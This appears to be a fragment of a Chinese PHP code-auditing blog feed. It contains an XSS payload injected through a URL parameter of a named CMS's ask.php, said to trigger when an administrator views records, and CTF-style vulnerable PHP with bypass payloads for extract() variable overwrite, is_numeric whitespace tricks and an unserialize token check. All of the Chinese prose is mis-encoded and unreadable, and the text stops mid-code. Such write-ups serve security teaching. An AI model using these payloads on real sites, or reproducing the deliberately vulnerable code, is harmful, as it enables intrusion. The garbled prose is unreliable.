alt=""></p><p>å¯ä»¥çœ‹åˆ°,è¿™ä¸ªurl æ²¡æœ‰è¿›è¡Œ è¿‡æ»¤ ç›´æ¥æ’å…¥åˆ°äº† è¯­å¥ä¸­<br>æ¥ä¸‹æ¥åœ¨urlä¸­æ„é€ xssä»£ç <br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="meta-keyword">/to/</span>zzmcs<span class="meta-keyword">/user/</span>ask.php?do=modify<span class="variable">&amp;page</span>=<span class="number">1</span><span class="variable">&amp;id</span>=<span class="number">1</span><span class="variable">&amp;aaa</span>=<span class="params">&lt;sCrIpT&gt;</span>alert(<span class="meta-keyword">/xss/</span>)<span class="params">&lt;/ScRiPt&gt;</span></span><br></pre></td></tr></table></figure></p><p>å½“ç®¡ç†å‘˜è®¿é—®åå°æŸ¥çœ‹ä¸è‰¯æ•°æ®æ—¶ä¼šè§¦å‘XSSæ¼æ´</p><h1 id="ä»£ç å®¡è®¡ç»éªŒ"><a href="#ä»£ç å®¡è®¡ç»éªŒ" class="headerlink" title="ä»£ç å®¡è®¡ç»éªŒ"></a>ä»£ç å®¡è®¡ç»éªŒ</h1><p>åœ¨åˆ†æcms æˆ–è€…æ˜¯å¾ˆé•¿çš„ä»£ç æ—¶ ç”¨seay ç­‰å®¡è®¡ç³»ç»Ÿè¿›è¡Œè¿½è¸ªè°ƒè¯• æ›´æ–¹ä¾¿æ¸…æ™°<br>å¯¹ç”¨æˆ·å¯æ§çš„æ•°æ® åˆ©ç”¨å®¡è®¡ç³»ç»Ÿè¿›è¡Œè¿½è¸ª çœ‹çœ‹è¿›è¡Œäº†å“ªäº›åŒ…è£…è¿‡æ»¤,å¹¶åˆ†æè¿™äº›å‡½æ•°æ˜¯å¦æœ‰æ¼æ´å¯ç»•è¿‡<br>å…³æ³¨ åŠŸèƒ½ä»£ç ï¼Œé…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚çœ‹çœ‹è¿‡æ»¤sqlæ³¨å…¥åŠŸèƒ½çš„ä»£ç  æ•°æ®åº“è¿æ¥æ—¶æ˜¯å¦å‡ºç°æ¼æ´<br>åˆ†æå„ç±»æ¼æ´å¯èƒ½ä½¿ç”¨çš„å±é™©å‡½æ•°,å¯»æ‰¾è¿™äº›èƒ½å¤Ÿäº§ç”Ÿæ¼æ´çš„å‡½æ•°è¿›è¡Œåˆ†æ æ¯”å¦‚unlink(),fread(),eval(),preg_replace(),query()ç­‰ç­‰<br>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œæ¯”å¦‚ ç¨‹åºæ˜¯å¦å¯ä»¥é‡å¤å®‰è£… ï¼Œä¿®æ”¹å¯†ç æ˜¯å¦å­˜åœ¨è¶Šæƒä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç ï¼Œæ‰¾å›å¯†ç éªŒè¯ç æ˜¯å¦å¯ä»¥æš´åŠ›ç ´è§£, éªŒè¯å­˜åœ¨ç»•è¿‡<br>è¦å­¦ä¼šç»å¸¸å¤ç° å¤ç°ä¼šé‡åˆ°é—®é¢˜ ä½ çš„é—®é¢˜æœ‰å¯èƒ½ä¸åˆ«äººçš„ä¸ä¸€æ · ä½ æµ‹è¯•æˆåŠŸpayloadè¯­å¥å’Œpocä¹Ÿæœ‰å¯èƒ½ä¸åˆ«äººä¸ä¸€æ ·<br>åœ¨è¿›è¡Œå¯¹æŸä¸ªcmsè¿›è¡Œå®¡è®¡æ—¶ å¯ä»¥å»çœ‹çœ‹è¿™ä¸ªcmså®˜ç½‘çš„å†å²æ›´æ–°ç‰ˆæœ¬å³å†å²æ¼æ´,</p>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php_bugs(phpä»£ç å®¡è®¡åŸºç¡€)</title>
      <link href="/2019/03/16/php-bugs-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/03/16/php-bugs-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥ä¸‹éƒ½æ˜¯ä»¥ä¸‹ä»£ç å®¡è®¡çš„ä¸€äº›åŸºç¡€æ¼æ´,é€‚åˆæ–°æ‰‹å­¦ä¹ ~</p><h2 id="extract-å˜é‡è¦†ç›–"><a href="#extract-å˜é‡è¦†ç›–" class="headerlink" title="extract å˜é‡è¦†ç›–"></a>extract å˜é‡è¦†ç›–</h2><p>extract(array,extract_rules,prefix)<br>è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚ä½†æ˜¯å½“å˜é‡ä¸­æœ‰åŒåçš„å…ƒç´ æ—¶ï¼Œè¯¥å‡½æ•°é»˜è®¤å°†åŸæœ‰çš„å€¼ç»™è¦†ç›–æ‰ã€‚è¿™å°±é€ æˆäº†å˜é‡è¦†ç›–æ¼æ´ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag=<span class="string">'xxx'</span>;</span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span></span><br><span class="line"><span class="php"> &#123;</span></span><br><span class="line"><span class="php">    $content=trim(@file_get_contents($flag));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($shiyan==$content)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">   <span class="keyword">else</span></span></span><br><span class="line"><span class="php">   &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>1ã€æ–‡ä»¶å°†getæ–¹æ³•ä¼ è¾“è¿›æ¥çš„å€¼é€šè¿‡extrace()å‡½æ•°å¤„ç†ã€‚<br>2ã€é€šè¿‡ä¸¤ä¸ªifè¯­å¥åˆ†åˆ«åˆ¤æ–­æ˜¯å¦å­˜åœ¨giftå˜é‡ï¼Œå’Œå˜é‡giftçš„å€¼å’Œå˜é‡contentçš„å€¼æ˜¯å¦ç›¸ç­‰ã€‚å˜é‡contentçš„å€¼æ˜¯é€šè¿‡è¯»å–å˜é‡testçš„å€¼è·å–åˆ°çš„ã€‚å¦‚æœä¸¤ä¸ªå˜é‡ç›¸ç­‰è¾“å‡ºflagã€‚å¦‚æœä¸ç›¸ç­‰ï¼Œè¾“å‡ºé”™è¯¯ã€‚<br>ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“testçš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å˜é‡è¦†ç›–æ¼æ´ï¼Œé‡æ–°ç»™testèµ‹å€¼ã€‚</p><p>ä¾‹å¦‚ï¼š$GET[â€˜testâ€™]=â€™aâ€™,è¢«extractï¼ˆï¼‰å‡½æ•°å¤„ç†åï¼Œå°±å˜æˆäº†$test=â€™aâ€™,æœ‰ä¸ä¹‹åŒåçš„å˜é‡$test = â€˜â€˜;ï¼Œå°†å…¶å€¼è¦†ç›–æ‰ã€‚å¹¶ä¸”getæ–¹æ³•ä¼ è¾“çš„giftå‚æ•°çš„å€¼ä¹Ÿä¸ºaã€‚è¿™æ ·ï¼Œ$gift=$contentã€‚å°±å¯ä»¥è·å¾—flagã€‚</p><p>æ„é€ æˆ‘ä»¬çš„payloadï¼š<br>?shiyan=&amp;flag=</p><h2 id="ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦"><a href="#ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦" class="headerlink" title="ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦"></a>ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$info = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">$req = [];</span></span><br><span class="line"><span class="php">$flag=<span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); <span class="comment">//ä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); <span class="comment">//å…³é—­æ‰€æœ‰PHPé”™è¯¯æŠ¥å‘Š</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'number'</span>]))&#123;</span></span><br><span class="line"><span class="php">   header(<span class="string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="comment">//HTTPå¤´æ˜¾ç¤ºhint 26966dc52e85af40f59b4fe73d8c323a.txt</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); <span class="comment">//die â€” ç­‰åŒäº exit()</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123;  <span class="comment">//foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼</span></span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="php">        $value = trim($value);  <span class="comment">//trim â€” å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰</span></span></span><br><span class="line"><span class="php">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); <span class="comment">// is_string â€” æ£€æµ‹å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œaddslashes â€” ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $number = strval($number); <span class="comment">//strval â€” è·å–å˜é‡çš„å­—ç¬¦ä¸²å€¼</span></span></span><br><span class="line"><span class="php">    $i = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    $j = strlen($number) - <span class="number">1</span>; <span class="comment">//strlen â€” è·å–å­—ç¬¦ä¸²é•¿åº¦</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>($i &lt; $j) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $i++;</span></span><br><span class="line"><span class="php">        $j--;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>])) <span class="comment">//is_numeric â€” æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>]))) <span class="comment">//intval â€” è·å–å˜é‡çš„æ•´æ•°å€¼</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     $value1 = intval($req[<span class="string">"number"</span>]);</span></span><br><span class="line"><span class="php">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     <span class="keyword">if</span>($value1!=$value2)&#123;</span></span><br><span class="line"><span class="php">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php">     <span class="keyword">else</span></span></span><br><span class="line"><span class="php">     &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span></span><br><span class="line"><span class="php">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</span></span><br><span class="line"><span class="php">          &#125;</span></span><br><span class="line"><span class="php">          <span class="keyword">else</span></span></span><br><span class="line"><span class="php">          &#123;</span></span><br><span class="line"><span class="php">             $info=$flag;</span></span><br><span class="line"><span class="php">          &#125;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $info;</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡åˆ†ææäº¤çš„æ•°éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½æ‹¿åˆ°flagï¼š<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>is_numeric($_REQUEST[<span class="string">'number'</span>])$req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])is_numericå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­— è¿™ä¸¤å¥è¦æ±‚æäº¤çš„æ•°ä¸èƒ½æ˜¯æ•°å­—åŒ…æ‹¬å°æ•°</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="keyword">if</span>(intval($req[<span class="string">"number"</span>])!=$intval(strrev($req[<span class="string">"number"</span>])))è¿™å¥çš„è¦æ±‚ä¸ºè¯¥æ•°çš„åè½¬çš„æ•´æ•°å€¼åº”è¯¥ç­‰äºå®ƒæœ¬èº«çš„æ•´æ•°å€¼å³æ˜¯ä¸€ä¸ªå›æ–‡æ•°</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>is_palindrome_number($req[<span class="string">"number"</span>]))è¿™å¥è¦æ±‚æäº¤çš„æ•°ä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°</span><br><span class="line">ä»è¦æ±‚çš„æ¡ä»¶æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªç»•è¿‡ç¬¬ä¸€ä¸ªæ¡ä»¶å’Œç¬¬ä¸‰ä¸ªæ¡ä»¶å³å¯</span><br><span class="line"></span><br><span class="line">is_numericå‡½æ•°åœ¨å¼€å§‹åˆ¤æ–­å‰ï¼Œä¼šå…ˆè·³è¿‡æ‰€æœ‰ç©ºç™½å­—ç¬¦å¯æ˜¯é¢˜ç›®è·å–$req[â€˜numberâ€™]çš„æ—¶å€™æ˜æ˜ä½¿ç”¨<span class="keyword">trim</span>è¿‡æ»¤äº†ç©ºç™½å­—ç¬¦è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å¼•å…¥\fï¼ˆä¹Ÿå°±æ˜¯%0cï¼‰åœ¨æ•°å­—å‰é¢ï¼Œæ¥ç»•è¿‡æœ€åé‚£ä¸ªis_palindrome_numberå‡½æ•°ï¼Œè€Œå¯¹äºå‰é¢çš„æ•°å­—åˆ¤æ–­ï¼Œå› ä¸ºintvalå’Œis_numericéƒ½ä¼šå¿½ç•¥è¿™ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“ã€‚</span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬æ„é€ payload=URL?%00%0c131å³å¯ç»•è¿‡ä¸Šé¢çš„æ¡ä»¶è·å¾—flag</span><br></pre></td></tr></table></figure></p><h2 id="å¤šé‡åŠ å¯†"><a href="#å¤šé‡åŠ å¯†" class="headerlink" title="å¤šé‡åŠ å¯†"></a>å¤šé‡åŠ å¯†</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'common.php'</span>;</span></span><br><span class="line"><span class="php">    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span></span><br><span class="line"><span class="php">    <span class="comment">//æŠŠä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„åˆå¹¶ä¸ºä¸€ä¸ªæ•°ç»„</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $where;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($where)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $sql = mysql_query(<span class="string">'select * from user where '</span>.$where);</span></span><br><span class="line"><span class="php">            <span class="comment">//å‡½æ•°æ‰§è¡Œä¸€æ¡ MySQL æŸ¥è¯¢ã€‚</span></span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> @mysql_fetch_array($sql);</span></span><br><span class="line"><span class="php">            <span class="comment">//ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› false</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span></span><br><span class="line"><span class="php">    <span class="comment">//æµ‹è¯•å˜é‡æ˜¯å¦å·²ç»é…ç½®ã€‚è‹¥å˜é‡å·²å­˜åœ¨åˆ™è¿”å› true å€¼ã€‚å…¶å®ƒæƒ…å½¢è¿”å› false å€¼ã€‚</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span></span><br><span class="line"><span class="php">        <span class="comment">//gzuncompress:è¿›è¡Œå­—ç¬¦ä¸²å‹ç¼©</span></span></span><br><span class="line"><span class="php">        <span class="comment">//unserialize: å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸå› PHP çš„å€¼</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $db = <span class="keyword">new</span> db();</span></span><br><span class="line"><span class="php">        $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span></span><br><span class="line"><span class="php">        <span class="comment">//mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ "</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        header(<span class="string">'Location: index.php?error=1'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å‘ç°è¿™æ®µ<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">    echo <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">"(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ "</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  header(<span class="string">'Location: index.php?error=1'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>login[â€˜userâ€™]ä»è¿™æ®µæ¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">  $db = <span class="keyword">new</span> db();</span><br><span class="line">  $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br></pre></td></tr></table></figure></p><p>å‘ç°requsetä¸­è·å–tokenå€¼ç„¶åå¯¹å®ƒè¿›è¡Œunserializeï¼Œgzuncompressï¼Œbase64_decodeç­‰ä¸€ç³»åˆ—æ“ä½œå¾—åˆ°loginï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unserializeï¼šå¯¹å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è¿›è¡Œæ“ä½œï¼Œå°†å…¶è½¬æ¢å› PHP çš„å€¼</span><br><span class="line"></span><br><span class="line">gzuncompressï¼šè§£å‹è¢«å‹ç¼©çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨loginä¸­è·å–é”®ä¸ºuserçš„å€¼ï¼Œå¦‚æœç­‰äºichunqiuå°±å¾—å‡ºflag</p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦å¯¹user:ichunqiuè¿›è¡Œä¸€ç³»åˆ—é€†æ“ä½œå°±è¡Œ<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = <span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span 